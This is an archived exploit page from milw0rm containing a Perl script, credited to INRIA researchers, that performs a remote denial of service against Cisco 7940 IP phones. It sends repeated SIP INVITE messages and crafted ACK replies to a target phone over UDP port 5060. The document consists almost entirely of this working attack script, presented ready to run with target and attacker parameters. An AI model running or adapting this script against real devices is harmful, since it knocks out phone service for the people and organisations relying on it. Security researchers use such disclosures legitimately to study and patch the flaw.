<html><head><title>Cisco Phone 7940 Remote Denial of Service Exploit</title></head><pre>#!/usr/bin/perl
 

###############################
# Vulnerabily discovered using KiF ~ Kiph
#
# Authors:
# Humberto J. Abdelnur (Ph.D Student)
# Radu State (Ph.D)
# Olivier Festor (Ph.D)
#
# Madynes Team, LORIA - INRIA Lorraine
# http://madynes.loria.fr
############################### 
use IO::Socket::INET;
use String::Random; 
die &quot;Usage $0 &lt;targetIP&gt; &lt;targetUser&gt; &lt;attackerIP&gt; &lt;attackerUser&gt;&quot;
unless ($ARGV[3]); 
$targetUser = $ARGV[1];
$targetIP = $ARGV[0]; 
$attackerUser = $ARGV[3];
$attackerIP= $ARGV[2]; 
$socket=new IO::Socket::INET-&gt;new(
Proto=&gt;'udp',
PeerPort=&gt;5060,
PeerAddr=&gt;$targetIP,
LocalPort=&gt;5060); 
$foo = new String::Random; 
$flag = 0;
@calls;
$threads = 0; 
while ($flag == 0){
$callid= &quot; &quot; . $foo-&gt;randpattern(&quot;CCCnccnC&quot;) .&quot;\@$attackerIP&quot;;
$cseq = $foo-&gt;randregex('\d\d\d\d'); 
$msg = &quot;INVITE sip:$targetIP SIP/2.0\r
Via: SIP/2.0/UDP $attackerIP;branch=z9hG4bK1\r
From: &lt;sip:$attackerUser\@$attackerIP&gt;;tag=1\r
To: &lt;sip:$targetUser\@$targetIP&gt;\r
Call-ID:$callid\r
CSeq: $cseq INVITE\r
Max-Forwards: 70\r
Contact: &lt;sip:$attackerUser\@$attackerIP&gt;\r
Allow: INVITE, ACK, CANCEL, BYE, OPTIONS, REFER, SUBSCRIBE, NOTIFY,
MESSAGE\r
Content-Length: 0\r
\r
&quot;;
$socket-&gt;send($msg); 
$socket-&gt;recv($text,1024,0);
if ($text =~ /^SIP\/2.0 100(.\r\n)*/ ){
push(@calls, $callid);
sleep(1);
}elsif ($text =~ /^SIP\/2.0 486(.\r\n)*/ ){
if ($thread == 0){
$thread = scalar(@calls);
}
while (scalar(@calls) ge $thread){
$toTag = $cseq= $callid= $text;
$toTag =~ s/^(.*\r\n)*(To|t):(.*?&gt;)(;.*?)?\r\n(.*\r\n)*/\4/;

$callid =~ s/^(.*\r\n)*Call-ID:(.*)\r\n(.*\r\n)*/\2/;
$cseq =~ s/^(.*\r\n)*CSeq: (.*?) (.*?)\r\n(.*\r\n)*/\2/; 
$msg = &quot;ACK sip:$targetIP SIP/2.0\r
Via: SIP/2.0/UDP $attackerIP;branch=z9hG4bK1\r
From: &lt;sip:$attackerUser\@$attackerIP&gt;;tag=1\r
To: &lt;sip:$targetUser\@$targetIP&gt;$toTag\r
Call-ID:$callid\r
CSeq: $cseq ACK\r
Contact: &lt;sip:$attackerUser\@$attackerIP&gt;\r
Content-Length: 0\r
\r
&quot;;
$socket-&gt;send($msg);
$i= 0;
while ($i &lt; scalar(@calls)){
if (@calls[$i] eq $callid){
delete @calls[$i];
}else{
$i += 1;
}
}
if (scalar(@calls) ge $thread){
$socket-&gt;recv($text,1024,0);
}
}
}
}

# milw0rm.com [2007-12-05]</pre></html>